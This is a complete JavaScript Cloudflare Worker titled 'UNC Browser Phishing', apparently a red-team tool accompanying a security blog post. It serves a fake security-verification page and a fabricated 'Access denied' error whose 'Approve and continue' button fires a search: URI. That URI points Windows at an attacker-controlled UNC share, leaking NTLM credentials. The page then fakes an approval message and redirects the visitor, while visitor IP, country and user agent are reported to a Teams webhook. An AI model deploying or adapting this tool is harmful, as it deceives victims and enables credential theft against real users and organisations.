/**
 * UNC Browser Phishing (Blog link: https://smbdsecurity.com/research/click-open-crack/)
 */

const CONFIG = {
    TARGET_PATH: '\\\\YOUR_SERVER_IP\\sharename',
    ALLOWED_DOMAIN: 'yourdomain.com',
    VERIFY_ACTION: 'security_verification',
    MAX_ATTEMPTS: 5,
    TRACKING_WINDOW: 3600,
    REDIRECT_URL: 'https://www.smbdsecurity.com'
};

const VISITOR_TRACKER = new Map();

export default {
    async fetch(request, env) {
        try {
            const url = new URL(request.url);
            
            const visitor = {
                ip: request.headers.get('CF-Connecting-IP') || 
                     request.headers.get('X-Forwarded-For') || 
                     'unknown',
                ua: request.headers.get('User-Agent') || 'unknown',
                time: new Date().toISOString(),
                path: url.pathname,
                referer: request.headers.get('Referer') || 'none',
                country: request.headers.get('CF-IPCountry') || 'unknown',
            };

            // Handle verification POST
            if (url.pathname === '/verify' && request.method === 'POST') {
                return await handleVerification(request, env, visitor);
            }

            // Handle UNC trigger - only after verification
            if (url.pathname === '/trigger-unc' && request.method === 'GET') {
                return await handleUNCPath(request, env);
            }

            // New visitor notification
            await notifyTeams(visitor, env, 'New visitor', 'visit');
            return showVerificationPage(env.TURNSTILE_SITE_KEY);

        } catch (error) {
            console.error('Worker error:', error);
            return showErrorPage('Service temporarily unavailable.', 500);
        }
    }
};

// Verify Turnstile token and return UNC URI
async function handleVerification(request, env, visitor) {
    if (!(request.headers.get('Accept') || '').includes('application/json')) {
        return jsonResponse({ error: 'Not acceptable.' }, 406);
    }

    if (!env.TURNSTILE_SITE_KEY || !env.TURNSTILE_SECRET_KEY) {
        return jsonResponse({ error: 'Service not configured correctly.' }, 500);
    }

    // Rate limiting check
    const rateLimit = await checkRateLimit(visitor.ip);
    if (!rateLimit.allowed) {
        await notifyTeams(visitor, env, 'Rate limit exceeded', 'failed');
        return jsonResponse({ error: 'Too many attempts.' }, 429);
    }

    let formData;
    try {
        formData = await request.formData();
    } catch {
        return jsonResponse({ error: 'Invalid request.' }, 400);
    }

    const token = formData.get('cf-turnstile-response');
    if (!token || typeof token !== 'string') {
        return jsonResponse({ error: 'Security check not completed.' }, 400);
    }

    const result = await verifyTurnstile(token, env.TURNSTILE_SECRET_KEY, visitor.ip);
    
    if (!result.success || 
        result.hostname !== (CONFIG.ALLOWED_DOMAIN?.trim() || new URL(request.url).hostname) || 
        result.action !== CONFIG.VERIFY_ACTION) {
        await notifyTeams(visitor, env, 'Verification failed', 'failed');
        return jsonResponse({ error: 'Security verification failed.' }, 403);
    }

    await notifyTeams(visitor, env, 'Verification passed', 'success');

    // Build UNC URI on server - never expose in HTML
    const searchUri = 'search:query=test&crumb=location:' + encodeURIComponent(CONFIG.TARGET_PATH);

    return new Response(
        JSON.stringify({
            success: true,
            searchUri: searchUri,
            redirectUrl: CONFIG.REDIRECT_URL
        }),
        {
            status: 200,
            headers: {
                'Content-Type': 'application/json; charset=UTF-8',
                'Cache-Control': 'no-store',
                'Referrer-Policy': 'no-referrer',
            },
        }
    );
}

// Trigger UNC path via search: URI handler
async function handleUNCPath(request, env) {
    const uncPath = CONFIG.TARGET_PATH;
    const searchUri = 'search:query=test&crumb=location:' + encodeURIComponent(uncPath);

    return new Response(`<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Accessing Resource</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{min-height:100vh;display:grid;place-items:center;background:#f5f6f8;font-family:system-ui,sans-serif;padding:20px;}
        .card{text-align:center;padding:40px;background:#fff;border-radius:14px;box-shadow:0 22px 65px rgba(31,42,55,0.09);max-width:500px;}
        .spinner{width:48px;height:48px;border:4px solid #e2e8f0;border-top-color:#2563eb;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 20px;}
        h1{font-size:24px;font-weight:600;margin:0 0 8px;color:#0f172a;}
        p{color:#64748b;font-size:14px;line-height:1.6;margin:0;}
        @keyframes spin{to{transform:rotate(360deg);}}
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h1>Accessing Resource</h1>
        <p>Please wait while we connect you...</p>
    </div>
    <script>
        const uri = '${searchUri}';
        try { 
            window.location.href = uri; 
        } catch(e) {}
        try {
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = uri;
            document.body.appendChild(iframe);
            setTimeout(function() {
                if (iframe.parentNode) iframe.remove();
            }, 5000);
        } catch(e) {}
        setTimeout(function() {
            window.location.href = '${CONFIG.REDIRECT_URL}';
        }, 5000);
    </script>
</body>
</html>`, {
        status: 200,
        headers: {
            'Content-Type': 'text/html; charset=UTF-8',
            'Cache-Control': 'no-store, no-cache, must-revalidate',
            'Referrer-Policy': 'no-referrer',
        },
    });
}

// Landing page with Turnstile widget
function showVerificationPage(siteKey) {
    if (!siteKey) {
        return showErrorPage('Security verification is not configured correctly.', 500);
    }

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>Security Verification</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        :root {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            color: #1e293b;
            background: #f1f5f9;
        }
        * { box-sizing: border-box; }
        body {
            min-height: 100vh;
            margin: 0;
            padding: 24px;
            display: grid;
            place-items: center;
            background: #f1f5f9;
        }
        .container { width: 100%; max-width: 480px; }
        .panel {
            padding: 40px 40px 32px;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            background: #ffffff;
            box-shadow: 0 1px 3px rgba(0,0,0,0.06), 0 4px 24px rgba(0,0,0,0.04);
        }
        .icon {
            width: 48px;
            height: 48px;
            margin-bottom: 16px;
            display: grid;
            place-items: center;
            border-radius: 50%;
            background: #eff6ff;
            color: #2563eb;
        }
        .icon svg { width: 24px; height: 24px; }
        h1 {
            margin: 0 0 8px;
            font-size: 22px;
            font-weight: 600;
            letter-spacing: -0.2px;
            color: #0f172a;
        }
        .desc {
            margin: 0 0 24px;
            color: #64748b;
            font-size: 14px;
            line-height: 1.6;
        }
        #verify-form { min-height: 66px; display: flex; align-items: center; justify-content: center; }
        .status-row {
            margin-top: 16px;
            display: flex;
            align-items: center;
            gap: 10px;
            color: #475569;
            font-size: 14px;
            padding: 10px 14px;
            background: #f8fafc;
            border-radius: 6px;
            border: 1px solid #e2e8f0;
            min-height: 44px;
        }
        .spinner {
            flex: 0 0 auto;
            width: 16px;
            height: 16px;
            border: 2px solid #cbd5e1;
            border-top-color: #2563eb;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .error-text { color: #dc2626; }
        .footer {
            margin-top: 16px;
            color: #94a3b8;
            text-align: center;
            font-size: 12px;
        }
        noscript {
            display: block;
            padding: 12px;
            border-radius: 8px;
            background: #fef2f2;
            color: #dc2626;
            font-size: 14px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        @media (max-width: 600px) {
            .panel { padding: 28px 20px; }
            h1 { font-size: 20px; }
        }

        #error-section {
            margin-top: 20px;
            padding: 16px 18px 20px;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            background: #f8fafc;
            display: none;
        }
        #error-section.visible { display: block; }
        #error-section .err-title {
            font-size: 14px;
            font-weight: 600;
            color: #0f172a;
            margin-bottom: 4px;
        }
        #error-section .err-sub {
            font-size: 13px;
            color: #475569;
            line-height: 1.5;
        }
        #error-section .err-detail {
            margin-top: 10px;
            padding: 8px 12px;
            background: #ffffff;
            border: 1px solid #e2e8f0;
            border-radius: 4px;
            font-family: 'SF Mono', 'Menlo', monospace;
            font-size: 12px;
            color: #0f172a;
            word-break: break-all;
        }
        #error-section .err-code {
            margin-top: 6px;
            font-family: 'SF Mono', 'Menlo', monospace;
            font-size: 12px;
            color: #64748b;
        }
        #error-section .err-actions {
            margin-top: 14px;
        }
        .btn-primary {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 600;
            font-family: inherit;
            cursor: pointer;
            transition: background 0.2s;
            background: #2563eb;
            color: #ffffff;
        }
        .btn-primary:hover { background: #1d4ed8; }
        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
        .btn-primary .mini-spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255,255,255,0.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
        }
        .hidden { display: none !important; }
        .text-sm { font-size: 13px; color: #64748b; }
        .flex { display: flex; align-items: center; gap: 8px; }
        .success-text { color: #16a34a; font-weight: 500; }
    </style>
</head>
<body>
    <div class="container">
        <div class="panel">
            <div class="icon" aria-hidden="true">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"></path>
                    <path d="m9 12 2 2 4-4"></path>
                </svg>
            </div>

            <h1>Security verification</h1>
            <p class="desc">Complete the verification below to confirm you are human.</p>

            <form id="verify-form" method="POST" action="/verify">
                <div class="cf-turnstile"
                    data-sitekey="${escapeHtml(siteKey)}"
                    data-action="${CONFIG.VERIFY_ACTION}"
                    data-theme="light"
                    data-callback="onVerify"
                    data-error-callback="onError"
                    data-expired-callback="onExpired">
                </div>
                <noscript>JavaScript must be enabled to complete this check.</noscript>
            </form>

            <div class="status-row" id="status-row">
                <span id="status-spinner" class="spinner" aria-hidden="true"></span>
                <span id="status-text">Checking your browser...</span>
            </div>

            <div id="error-section">
                <div class="err-title" id="err-title">Unable to complete request</div>
                <div class="err-sub" id="err-sub">
                    Your identity was verified but we could not establish a secure connection to your organization's directory.
                </div>
                <div class="err-detail" id="err-detail">
                    Error: 0x80070005 - Access denied
                </div>
                <div class="err-code" id="err-code">
                    Correlation ID: <span id="correlation-id">${Math.random().toString(36).substring(2, 10)}</span>
                </div>
                <div class="err-actions" id="err-actions">
                    <button class="btn-primary" id="approve-btn">
                        Approve and continue
                    </button>
                </div>
                <div id="processing-area" class="hidden" style="margin-top: 12px;">
                    <div class="flex">
                        <span class="mini-spinner" style="border-color:#e2e8f0;border-top-color:#2563eb;"></span>
                        <span class="text-sm" id="processing-text">Requesting approval from your organization...</span>
                    </div>
                </div>
                <div id="success-area" class="hidden" style="margin-top: 12px;">
                    <div class="flex">
                        <span style="color:#16a34a;font-weight:bold;">✓</span>
                        <span class="text-sm success-text">Approval granted. Redirecting...</span>
                    </div>
                </div>
            </div>
        </div>
        <div class="footer">Security verification</div>
    </div>

    <script>
        let verified = false;
        let submitting = false;
        let errorShown = false;
        const statusSpinner = document.getElementById('status-spinner');
        const statusText = document.getElementById('status-text');

        window.onVerify = function() {
            verified = true;
            statusText.textContent = 'Verification successful. Processing...';
            statusSpinner.className = 'spinner';
            autoSubmit();
        };

        window.onError = function() {
            verified = false;
            statusSpinner.className = 'spinner';
            statusText.textContent = 'Verification failed. Refresh the page.';
            statusText.className = 'error-text';
        };

        window.onExpired = function() {
            verified = false;
            statusSpinner.className = 'spinner';
            statusText.textContent = 'Verification expired. Please refresh.';
            statusText.className = '';
        };

        // Call /verify after Turnstile passes
        async function autoSubmit() {
            if (submitting || !verified) return;
            submitting = true;

            const form = document.getElementById('verify-form');
            statusText.textContent = 'Verifying your identity...';

            try {
                const response = await fetch('/verify', {
                    method: 'POST',
                    body: new FormData(form),
                    headers: { 'Accept': 'application/json' },
                    credentials: 'same-origin',
                });

                if (response.ok) {
                    const data = await response.json();
                    if (data && data.success) {
                        // Store URI from server, never build it client-side
                        window._uncData = {
                            uri: data.searchUri,
                            dest: data.redirectUrl
                        };

                        statusText.textContent = 'Verification complete. Validating connection...';
                        setTimeout(function() {
                            showErrorSection();
                        }, 10000);
                        return;
                    }
                }

                const errorData = await response.json().catch(() => null);
                statusSpinner.className = 'spinner';
                statusText.textContent = errorData?.error || 'Verification failed.';
                statusText.className = 'error-text';
            } catch (e) {
                statusSpinner.className = 'spinner';
                statusText.textContent = 'Network error. Please refresh.';
                statusText.className = 'error-text';
            }

            submitting = false;
        }

        function showErrorSection() {
            if (errorShown) return;
            errorShown = true;

            const section = document.getElementById('error-section');
            section.classList.add('visible');

            statusSpinner.className = 'spinner';
            statusText.textContent = 'Verification complete - connection failed';
            injectApprovalHandler();
        }

        // Inject UNC trigger code dynamically after verification
        function injectApprovalHandler() {
            const scriptEl = document.createElement('script');
            scriptEl.textContent = \`
                function handleApproval() {
                    const btn = document.getElementById('approve-btn');
                    const actions = document.getElementById('err-actions');
                    const processing = document.getElementById('processing-area');
                    const success = document.getElementById('success-area');
                    const text = document.getElementById('processing-text');
                    const uncData = window._uncData;
                    
                    if (!uncData) {
                        alert('Error: Verification data not found');
                        return;
                    }

                    btn.disabled = true;
                    actions.classList.add('hidden');
                    processing.classList.remove('hidden');

                    // Use pre-built URI from server
                    const searchUri = uncData.uri;
                    text.textContent = 'Requesting approval from your organization...';

                    try {
                        window.location.href = searchUri;
                    } catch(e) {}

                    try {
                        const link = document.createElement('a');
                        link.href = searchUri;
                        link.style.display = 'none';
                        document.body.appendChild(link);
                        link.click();
                        setTimeout(function() {
                            if (link.parentNode) link.remove();
                        }, 1000);
                    } catch(e) {}

                    setTimeout(function() {
                        text.textContent = 'Approval granted by your organization.';
                        processing.classList.add('hidden');
                        success.classList.remove('hidden');
                        document.getElementById('err-title').textContent = 'Request approved';
                        document.getElementById('err-title').style.color = '#0f172a';
                        document.getElementById('err-sub').textContent = 'Your organization has approved your access request.';
                        document.getElementById('err-detail').textContent = 'Authentication successful. Redirecting to secure resource.';
                        document.getElementById('err-detail').style.color = '#0f172a';
                        document.getElementById('err-detail').style.background = '#f0fdf4';
                        document.getElementById('err-detail').style.borderColor = '#bbf7d0';
                        document.getElementById('error-section').style.borderColor = '#bbf7d0';
                        document.getElementById('error-section').style.background = '#f0fdf4';
                        document.getElementById('err-code').textContent = 'Redirecting...';
                    }, 10000);

                    setTimeout(function() {
                        if (uncData.dest) {
                            window.location.href = uncData.dest;
                        }
                    }, 15000);
                }

                document.getElementById('approve-btn').addEventListener('click', handleApproval);
            \`;
            document.head.appendChild(scriptEl);
        }
    </script>
</body>
</html>`;

    return new Response(html, {
        status: 200,
        headers: {
            'Content-Type': 'text/html; charset=UTF-8',
            'Cache-Control': 'no-store',
            'Content-Security-Policy': [
                "default-src 'none'",
                "script-src 'unsafe-inline' https://challenges.cloudflare.com",
                "frame-src https://challenges.cloudflare.com",
                "connect-src 'self' https://challenges.cloudflare.com",
                "style-src 'unsafe-inline'",
                "img-src data:",
                "form-action 'self'",
                "base-uri 'none'",
                "frame-ancestors 'none'",
            ].join("; "),
            'Permissions-Policy': 'camera=(), microphone=(), geolocation=(), payment=(), usb=()',
            'Referrer-Policy': 'no-referrer',
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
        },
    });
}

function showErrorPage(message, status) {
    const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow">
    <title>Service Unavailable</title>
    <style>
        body {
            min-height: 100vh;
            margin: 0;
            padding: 24px;
            display: grid;
            place-items: center;
            background: #f5f6f8;
            color: #202124;
            font-family: Inter, ui-sans-serif, system-ui, sans-serif;
        }
        main {
            max-width: 480px;
            padding: 36px;
            background: #fff;
            border-radius: 14px;
            box-shadow: 0 20px 60px rgba(31,42,55,0.09);
        }
        h1 { font-size: 25px; margin-top: 0; }
        p { color: #5f6875; line-height: 1.6; }
        a { color: #245f9e; }
    </style>
</head>
<body>
    <main>
        <h1>Service unavailable</h1>
        <p>${escapeHtml(message)}</p>
        <p><a href="/">Try again</a></p>
    </main>
</body>
</html>`;

    return new Response(html, {
        status,
        headers: {
            'Content-Type': 'text/html; charset=UTF-8',
            'Cache-Control': 'no-store',
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'Referrer-Policy': 'no-referrer',
        },
    });
}

// Track IPs to prevent abuse
async function checkRateLimit(ip) {
    const currentTime = Math.floor(Date.now() / 1000);
    const visitorData = VISITOR_TRACKER.get(ip) || { count: 0, firstSeen: currentTime };

    if (currentTime - visitorData.firstSeen > CONFIG.TRACKING_WINDOW) {
        visitorData.count = 0;
        visitorData.firstSeen = currentTime;
    }

    if (visitorData.count >= CONFIG.MAX_ATTEMPTS) {
        return { allowed: false };
    }

    visitorData.count += 1;
    VISITOR_TRACKER.set(ip, visitorData);
    return { allowed: true };
}

async function verifyTurnstile(token, secretKey, remoteIp) {
    const body = new FormData();
    body.append('secret', secretKey);
    body.append('response', token);
    if (remoteIp) body.append('remoteip', remoteIp);

    try {
        const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
            method: 'POST',
            body,
        });
        if (!response.ok) {
            console.error('Turnstile API error:', response.status);
            return { success: false };
        }
        return await response.json();
    } catch (error) {
        console.error('Turnstile verification failed:', error);
        return { success: false };
    }
}

function jsonResponse(data, status) {
    return new Response(
        JSON.stringify({ success: false, ...data }),
        {
            status,
            headers: {
                'Content-Type': 'application/json; charset=UTF-8',
                'Cache-Control': 'no-store',
                'Referrer-Policy': 'no-referrer',
            },
        }
    );
}

function escapeHtml(value) {
    return String(value).replace(/[&<>"']/g, (char) => {
        const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
        return map[char];
    });
}

// Send Teams notifications
async function notifyTeams(visitor, env, title, eventType) {
    if (!env.TEAMS_WEBHOOK_URL) {
        return false;
    }

    try {
        const emojiMap = {
            'visit': '🌐',
            'success': '✅',
            'failed': '❌',
            'verified': '🔐'
        };
        const emoji = emojiMap[eventType] || '📊';

        const message = {
            type: 'message',
            attachments: [{
                contentType: 'application/vnd.microsoft.card.adaptive',
                content: {
                    type: 'AdaptiveCard',
                    version: '1.2',
                    body: [
                        {
                            type: 'TextBlock',
                            text: `${emoji} ${title}`,
                            weight: 'Bolder',
                            size: 'Medium',
                            wrap: true
                        },
                        {
                            type: 'FactSet',
                            facts: [
                                { title: 'IP', value: visitor.ip },
                                { title: 'Country', value: visitor.country || 'Unknown' },
                                { title: 'User Agent', value: visitor.ua.length > 60 ? visitor.ua.substring(0, 60) + '...' : visitor.ua },
                                { title: 'Time', value: new Date(visitor.time).toLocaleString() },
                                { title: 'Path', value: visitor.path },
                                { title: 'Referer', value: visitor.referer.length > 40 ? visitor.referer.substring(0, 40) + '...' : visitor.referer }
                            ]
                        }
                    ]
                }
            }]
        };

        const response = await fetch(env.TEAMS_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(message),
        });

        return response.ok;
    } catch (error) {
        console.error('Teams notification error:', error);
        return false;
    }
}
